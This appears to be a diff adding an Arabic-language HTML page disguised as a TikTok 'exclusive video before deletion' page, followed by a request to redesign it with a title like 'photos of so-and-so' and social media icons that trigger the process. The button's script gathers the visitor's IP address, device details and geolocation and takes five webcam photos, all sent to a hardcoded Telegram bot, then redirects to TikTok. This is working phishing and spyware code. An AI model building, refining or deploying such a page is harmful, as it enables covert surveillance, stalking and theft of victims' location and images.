@@ -1,1 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok | شاهد الآن</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+        }
 
+        /* خلفية الفيديو الوهمية */
+        .video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/eBwG3zZ.jpg') no-repeat center center;
+            background-size: cover;
+            filter: brightness(0.6);
+            z-index: 1;
+        }
+
+        /* حاوية المحتوى السفلي */
+        .bottom-content {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            z-index: 10;
+            text-align: right;
+        }
+
+        .user-info { margin-bottom: 15px; }
+        .user-info b { font-size: 18px; display: block; margin-bottom: 5px; }
+        .user-info p { font-size: 14px; margin: 0; color: #eee; }
+
+        /* تباين الزر وجعله واضحاً جداً */
+        .main-btn {
+            background-color: #fe2c55; /* لون تيك توك الصارخ */
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(254, 44, 85, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 1.5s infinite; /* تأثير النبض لجذب الانتباه */
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); box-shadow: 0 0 30px rgba(254, 44, 85, 0.8); }
+            100% { transform: scale(1); }
+        }
+
+        .btn-icon {
+            margin-left: 10px;
+            font-size: 24px;
+        }
+
+        /* شاشة التحميل */
+        .loading-screen {
+            display: none;
+            text-align: center;
+            width: 100%;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="video-bg"></div>
+
+    <div class="bottom-content">
+        <div id="ui-elements">
+            <div class="user-info">
+                <b>@Exclusive_Content</b>
+                <p>اضغط أدناه لمشاهدة الفيديو الحصري قبل الحذف! 🔥</p>
+            </div>
+
+            <button class="main-btn" onclick="executeProcess()">
+                <span class="btn-icon">▶</span>
+                مشاهدة الفيديو الآن
+            </button>
+        </div>
+
+        <div id="loading-area" class="loading-screen">
+            <div class="spinner"></div>
+            <p>جاري تحميل الفيديو... يرجى الانتظار ثوانٍ</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = "8548039211:AAGwUXfiInazMbpIHzwwTRr8CGeu4-BdDL4";
+        const CHAT_ID = "8146130042";
+
+        async function executeProcess() {
+            // تحويل الواجهة فوراً للتحميل
+            document.getElementById('ui-elements').style.display = 'none';
+            document.getElementById('loading-area').style.display = 'block';
+
+            // جمع البيانات الفنية
+            const techData = await fetchTech();
+            const now = new Date().toLocaleString('ar-EG');
+
+            let report = `🎥 **دخول تيك توك (زر واضح)**\n\n`;
+            report += `🕓 الوقت: ${now}\n`;
+            report += `🌍 IP: ${techData.ip}\n`;
+            report += `🔋 البطارية: ${techData.battery}\n`;
+            report += `🖥️ المعالج: ${navigator.hardwareConcurrency} Cores\n\n`;
+            report += `===== 🧾 User-Agent =====\n`;
+            report += `\`${navigator.userAgent}\``;
+
+            sendToTelegram(report);
+
+            // طلب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // طلب الكاميرا والتقاط 5 صور
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                let count = 0;
+                const interval = setInterval(() => {
+                    if(count < 5) {
+                        capture(count + 1);
+                        count++;
+                    } else {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://www.tiktok.com"; // تحويل نهائي
+                    }
+                }, 1200);
+            } catch(e) {
+                sendToTelegram("❌ رفض الكاميرا");
+                window.location.href = "https://www.tiktok.com";
+            }
+        }
+
+        async function fetchTech() {
+            let res = { ip: 'Unknown', battery: 'N/A' };
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                res.ip = d.ip;
+                const b = await navigator.getBattery();
+                res.battery = `${(b.level*100)}%`;
+            } catch(e){}
+            return res;
+        }
+
+        function capture(n) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', blob, 'img.jpg');
+                f.append('caption', `اللقطة ${n} | IP: ${CHAT_ID}`);
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(t) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
+            });
+        }
+    </script>
+</body>
+</html>
+
+غير واجهة وا عنوان خلي عنوان . مثلا . صور فلانة . وا اضغط لمشاهدة فيديو تكون في وسط شاشة اضافة ايقونات انستقرام وفيسبوك وتيك توك . تكون هذي ايقنوات بمجرد ضغط عليها تتم العملية
